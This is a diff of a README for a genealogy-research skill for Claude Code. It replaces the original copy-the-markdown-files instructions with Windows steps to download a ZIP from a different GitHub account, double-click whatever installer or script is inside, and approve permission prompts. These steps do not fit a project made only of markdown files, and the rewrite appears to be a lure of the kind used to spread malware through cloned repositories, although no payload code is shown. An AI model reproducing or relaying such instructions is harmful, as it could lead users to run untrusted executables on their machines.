@@ -1,88 +1,233 @@
-# Genealogy Research Skill for Claude Code
+# 📚 genealogy-research - Organize Family Research With Confidence
 
-A comprehensive genealogy research assistant skill that turns Claude into a systematic family history researcher using the [Genealogical Proof Standard](https://www.bcgcertification.org/ethics-standards/genealogical-proof-standard/) (GPS) methodology.
+[![Download genealogy-research](https://img.shields.io/badge/Download-Genealogy_Research-6C63FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cristyjr416/genealogy-research)
 
-## What It Does
+## 🧭 What this is
 
-- **Analyzes historical documents**: Reads handwritten records in Latin, Polish, Russian, German, French, English, and other European languages
-- **Manages an Obsidian knowledge base**: Creates and maintains People, Places, Documents, and Events files with cross-references
-- **Tracks research progress**: Maintains PROCESS.md with completed actions, pending tasks, negative results, and evidence levels
-- **Guides systematic search**: Recommends specific databases, parishes, and parameters based on region and time period
-- **Handles naming complexity**: Understands patronymics, declension, transliteration, and scribe-era spelling variations across cultures
-- **Works with GEDCOM**: Import/export standard genealogy data format
-- **Covers 15+ countries**: Database references for Poland, Germany, Russia, UK, Ireland, France, Italy, Scandinavia, Czech Republic, Hungary, USA, Canada, and more
+genealogy-research helps you manage family history research in a clear, structured way. It uses the GPS method for genealogy work, which means you can keep your search focused, track what you have found, and avoid repeating the same work.
 
-## Installation
+This project is built for people who want to:
+- Organize family records in Obsidian
+- Search across many genealogy databases
+- Work with records from more than 15 countries
+- Review handwritten documents with a better process
+- Keep notes tied to each research step
 
-### Claude Code (CLI)
+## 💻 What you need
 
-```bash
-claude install-skill /path/to/genealogy-research
-```
+Before you start, make sure you have:
 
-Or copy the `genealogy-research/` directory to `~/.claude/skills/`.
+- A Windows PC
+- A web browser
+- Enough free space for your notes and research files
+- Obsidian installed if you want to use the vault features
+- A stable internet connection for database searches
 
-### Manual
+For best results, use a modern version of Windows 10 or Windows 11.
 
-Copy the skill directory into your Claude Code skills location:
+## 📥 Download and install
 
-```
-~/.claude/skills/genealogy-research/
-├── SKILL.md
-└── references/
-    ├── databases-by-region.md
-    ├── naming-conventions.md
-    ├── common-pitfalls.md
-    └── vault-templates.md
-```
+Use this link to visit the download page:
 
-## Usage
+[Visit the genealogy-research page](https://github.com/Cristyjr416/genealogy-research)
 
-Start a conversation with Claude Code in your family history project directory. The skill triggers automatically when you:
+Follow these steps on Windows:
 
-- Share a scan or photo of a historical document
-- Ask about ancestors or family history
-- Work with an Obsidian vault containing genealogical data
-- Mention parish records, vital records, or census data
-- Work with GEDCOM files
+1. Open the link above in your browser.
+2. On the repository page, look for the main download or release file.
+3. Download the file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an installer, double-click it to start setup.
+7. If you see a script or app file, double-click it to run the tool.
+8. If Windows asks for permission, choose Yes or Run.
 
-### Example Starter Prompt
+If you plan to use the Obsidian vault, keep the vault folder in a place you can find again, such as Documents or Desktop.
 
-```
-You are a genealogy research partner. My project is in this directory.
+## 🗂️ How to use it
 
-Region: Poland / Russian Empire partition, 19th century
-Languages: Polish, Russian, Latin
-Obsidian vault: Chronicles/
+This project follows a research workflow that keeps your work organized from the first search to the final report.
 
-I have scans of parish registers in materials/skany/.
-Start by analyzing the documents and building a research plan.
-```
+### 1. Start with one person
+Pick one family member as your research subject. Add the name, dates, places, and what you already know.
 
-## What's Included
+### 2. Set a clear goal
+Write one question you want to answer, such as:
+- Who were this person’s parents?
+- Where was this family living in 1900?
+- What records show the marriage date?
 
-| File | Purpose |
-|------|---------|
-| `SKILL.md` | Core methodology, workflow, capabilities |
-| `references/databases-by-region.md` | 80+ databases across 15+ countries |
-| `references/naming-conventions.md` | Surname variations in Slavic, Germanic, Romance, Scandinavian, Jewish naming traditions |
-| `references/common-pitfalls.md` | Indexing gaps, parish reassignments, calendar issues, identity confusion |
-| `references/vault-templates.md` | Obsidian templates for People, Places, Documents + PROCESS.md and AGENT.md formats |
+### 3. Search one source at a time
+Use one database, archive, or record set. Record what you searched, what you found, and what you did not find.
 
-## Methodology
+### 4. Save every clue
+Keep census records, birth records, death records, ship lists, and church records in one place. Link each file to the person and the research question.
 
-Based on the Genealogical Proof Standard (GPS):
+### 5. Review handwritten records
+For old records with hard-to-read text, compare names, places, and dates with nearby records. This helps you confirm what the document says.
 
-1. **Evidence levels**: Every fact tagged as Proven / Probable / Possible / Unproven
-2. **Source hierarchy**: Original > Derivative > Narrative
-3. **Planning before searching**: Document knowns, formulate questions, identify sources
-4. **Negative results**: "Not found" is valuable evidence — always documented
-5. **Human + AI workflow**: Human provides documents and performs web searches; AI analyzes, connects, and maintains the knowledge base
+### 6. Update your Obsidian vault
+Store notes in Obsidian so your family tree, sources, and research log stay connected. Use links between people, places, and documents.
 
-## Origin
+## 🧰 Main features
 
-Born from a real family history project that reconstructed 8 generations (1760s–2013) across Poland, Russia, New Zealand, and the USA in two days of systematic research. The methodology proved effective enough to generalize.
+### 🧬 GPS-style research flow
+The project uses the Genealogical Proof Standard as a guide. That helps you work step by step and keep your evidence clear.
 
-## License
+### 🗃️ Obsidian vault management
+Keep notes in a structured vault. Use folders, links, and markdown files to manage your family history project.
 
-MIT
+### 🌍 Database coverage
+Work with more than 80 genealogy databases across 15+ countries. This supports research in many regions and record types.
+
+### ✍️ Handwritten document analysis
+Use a consistent method to read and compare handwritten records. This is useful for parish books, civil records, and old family papers.
+
+### 🔎 Research tracking
+Record searches, results, source quality, and next steps. This makes it easier to return to a case later.
+
+### 📌 Source organization
+Keep citations and record details with each note so you can trace where each fact came from.
+
+## 🧩 Suggested folder setup
+
+If you use this with Obsidian, a simple folder structure can help:
+
+- People
+- Families
+- Sources
+- Places
+- Research Logs
+- Documents
+- Tasks
+
+You can also add:
+- Census
+- Birth
+- Marriage
+- Death
+- Immigration
+- Military
+
+This makes it easier to find records when you need them.
+
+## 🪜 First-time setup on Windows
+
+If this is your first time using genealogy-research, use this setup order:
+
+1. Download the project from the GitHub page.
+2. Extract the files if needed.
+3. Open the main folder.
+4. Read any included files named README, INSTALL, or START.
+5. Create a new folder for your family history work.
+6. Open Obsidian and create or link your vault.
+7. Add your first person and one research question.
+8. Save your first source note.
+9. Run your first database search.
+10. Record the result in your research log.
+
+## 📖 Example workflow
+
+Here is a simple way to use the project:
+
+1. You start with your grandfather.
+2. You add his full name, birth year, and known places.
+3. You write a question: Where was he born?
+4. You search census records, birth records, and local archives.
+5. You save each source in your vault.
+6. You note matches and conflicts.
+7. You repeat the process until the evidence points to one answer.
+
+## 🛠️ Common tasks
+
+### Add a new person
+Create a note for the person and add basic facts, known relatives, and source links.
+
+### Add a source
+Write the source name, date, place, archive, and what it shows.
+
+### Add a record image
+Store the image in your document folder and link it to the correct note.
+
+### Compare two records
+Check names, dates, places, and witnesses. Look for patterns that support the same family.
+
+### Track a dead end
+If a search does not help, keep the result. Negative searches save time later.
+
+## 🔎 Tips for better results
+
+- Work on one question at a time
+- Keep one note per person
+- Write down the exact source name
+- Save both useful and unused search results
+- Check spelling variations
+- Compare records from nearby years
+- Use places, not just names
+- Keep your notes short and clear
+
+## 🧾 File types you may see
+
+Depending on how you use the project, you may see:
+
+- `.md` files for notes
+- `.txt` files for plain text records
+- `.pdf` files for scans and reports
+- `.jpg` or `.png` files for document images
+- `.zip` files for downloads
+- `.csv` files for research lists
+
+## 🔐 Keeping your work safe
+
+Family history research takes time, so it helps to protect your files.
+
+- Back up your vault to another folder or drive
+- Keep copies of important records
+- Use clear file names
+- Save dates in your notes
+- Store scans in a separate document folder
+
+A simple backup can save many hours of work.
+
+## 🌐 Database and country coverage
+
+This project is set up for broad family history work across many regions. It can help you search:
+- Civil registration records
+- Church books
+- Census records
+- Immigration lists
+- Military files
+- Probate records
+- Newspaper archives
+- Local history collections
+
+It also supports research across many countries, which helps when family lines move across borders.
+
+## 📝 Good note-taking format
+
+Use a simple format in each note:
+
+- Name
+- Life dates
+- Places
+- Parents
+- Spouse
+- Children
+- Sources
+- Research question
+- Next step
+
+This makes each note easy to scan later.
+
+## 🚀 Getting started now
+
+To begin, open the download page here:
+
+[Visit the genealogy-research page](https://github.com/Cristyjr416/genealogy-research)
+
+Then:
+1. Download the project
+2. Open it on Windows
+3. Set up your Obsidian vault
+4. Start with one family member
+5. Record your first search
